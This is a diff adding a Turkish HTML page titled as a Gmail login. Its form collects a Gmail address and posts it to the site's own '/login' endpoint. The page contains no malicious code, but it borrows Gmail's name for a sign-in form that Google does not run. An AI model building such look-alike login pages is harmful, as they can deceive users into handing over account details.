@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Gmail Giriş</title>
+  <style>
+    body {
+      background: linear-gradient(#0f2027, #203a43, #2c5364);
+      color: white;
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 100px;
+    }
+    input, button {
+      padding: 12px;
+      font-size: 1rem;
+      border-radius: 6px;
+      margin: 10px;
+      border: none;
+    }
+    input {
+      width: 300px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+    }
+    #result {
+      margin-top: 20px;
+      font-size: 1.1rem;
+    }
+  </style>
+</head>
+<body>
+  <h1>Gmail ile Giriş</h1>
+  <input type="email" id="email" placeholder="Gmail adresinizi girin" />
+  <br>
+  <button onclick="gonder()">Giriş Yap</button>
+  <div id="result"></div>
+
+  <script>
+    async function gonder() {
+      const email = document.getElementById('email').value;
+      const result = document.getElementById('result');
+      result.innerText = "Gönderiliyor...";
+      const res = await fetch('/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email })
+      });
+      const data = await res.json();
+      result.innerText = data.message || "Bir hata oluştu.";
+    }
+  </script>
+</body>
+</html>
